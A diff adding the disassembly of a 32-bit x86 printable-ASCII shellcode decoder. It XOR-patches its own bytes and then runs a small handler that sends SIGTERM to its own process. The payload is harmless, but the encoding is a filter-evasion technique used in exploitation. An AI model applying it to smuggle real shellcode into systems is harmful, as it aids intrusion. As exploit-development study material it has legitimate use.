@@ -1,0 +1,99 @@
+
+decoder_printable_handler.obj:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <initializer>:
+   0:	60                   	pusha  
+   1:	50                   	push   %eax
+   2:	59                   	pop    %ecx
+   3:	6a 30                	push   $0x30
+   5:	58                   	pop    %eax
+   6:	34 30                	xor    $0x30,%al
+   8:	48                   	dec    %eax
+   9:	50                   	push   %eax
+   a:	5b                   	pop    %ebx
+
+0000000b <xor_patcher>:
+   b:	6a 30                	push   $0x30
+   d:	58                   	pop    %eax
+   e:	30 59 3e             	xor    %bl,0x3e(%ecx)
+  11:	30 59 4c             	xor    %bl,0x4c(%ecx)
+  14:	30 59 5c             	xor    %bl,0x5c(%ecx)
+  17:	30 41 5d             	xor    %al,0x5d(%ecx)
+  1a:	30 59 5d             	xor    %bl,0x5d(%ecx)
+  1d:	30 41 5e             	xor    %al,0x5e(%ecx)
+  20:	30 59 64             	xor    %bl,0x64(%ecx)
+  23:	30 41 65             	xor    %al,0x65(%ecx)
+  26:	30 59 65             	xor    %bl,0x65(%ecx)
+  29:	30 41 66             	xor    %al,0x66(%ecx)
+  2c:	30 59 68             	xor    %bl,0x68(%ecx)
+  2f:	30 59 69             	xor    %bl,0x69(%ecx)
+  32:	30 59 79             	xor    %bl,0x79(%ecx)
+  35:	30 41 7a             	xor    %al,0x7a(%ecx)
+  38:	30 59 7a             	xor    %bl,0x7a(%ecx)
+  3b:	30 41 7b             	xor    %al,0x7b(%ecx)
+
+0000003e <anchor>:
+  3e:	72 49                	jb     89 <loop+0x3d>
+  40:	44                   	inc    %esp
+  41:	30 59 3b             	xor    %bl,0x3b(%ecx)
+  44:	30 59 3c             	xor    %bl,0x3c(%ecx)
+  47:	30 59 45             	xor    %bl,0x45(%ecx)
+  4a:	51                   	push   %ecx
+  4b:	5a                   	pop    %edx
+
+0000004c <loop>:
+  4c:	7f 79                	jg     c7 <end+0x2c>
+  4e:	57                   	push   %edi
+  4f:	26 74 38             	es je  8a <end_of_payload>
+  52:	6a 30                	push   $0x30
+  54:	58                   	pop    %eax
+  55:	34 30                	xor    $0x30,%al
+  57:	50                   	push   %eax
+  58:	5b                   	pop    %ebx
+  59:	32 59 57             	xor    0x57(%ecx),%bl
+  5c:	3f                   	aas    
+  5d:	2c 34                	sub    $0x34,%al
+  5f:	32 41 58             	xor    0x58(%ecx),%al
+  62:	24 3c                	and    $0x3c,%al
+  64:	3f                   	aas    
+  65:	27                   	daa    
+  66:	32 30                	xor    (%eax),%dh
+  68:	27                   	daa    
+  69:	77 42                	ja     ad <end+0x12>
+  6b:	57                   	push   %edi
+  6c:	6a 30                	push   $0x30
+  6e:	58                   	pop    %eax
+  6f:	34 30                	xor    $0x30,%al
+  71:	50                   	push   %eax
+  72:	5b                   	pop    %ebx
+  73:	32 59 58             	xor    0x58(%ecx),%bl
+  76:	32 41 59             	xor    0x59(%ecx),%al
+  79:	3f                   	aas    
+  7a:	2c 36                	sub    $0x36,%al
+  7c:	24 3f                	and    $0x3f,%al
+  7e:	30 27                	xor    %ah,(%edi)
+  80:	77 42                	ja     c4 <end+0x29>
+  82:	58                   	pop    %eax
+  83:	42                   	inc    %edx
+  84:	42                   	inc    %edx
+  85:	41                   	inc    %ecx
+  86:	41                   	inc    %ecx
+  87:	41                   	inc    %ecx
+  88:	75 3d                	jne    c7 <end+0x2c>
+
+0000008a <end_of_payload>:
+  8a:	61                   	popa   
+
+0000008b <handler>:
+  8b:	31 c0                	xor    %eax,%eax
+  8d:	b0 14                	mov    $0x14,%al
+  8f:	cd 80                	int    $0x80
+  91:	50                   	push   %eax
+  92:	5b                   	pop    %ebx
+  93:	31 c0                	xor    %eax,%eax
+  95:	b0 25                	mov    $0x25,%al
+  97:	b1 0f                	mov    $0xf,%cl
+  99:	cd 80                	int    $0x80
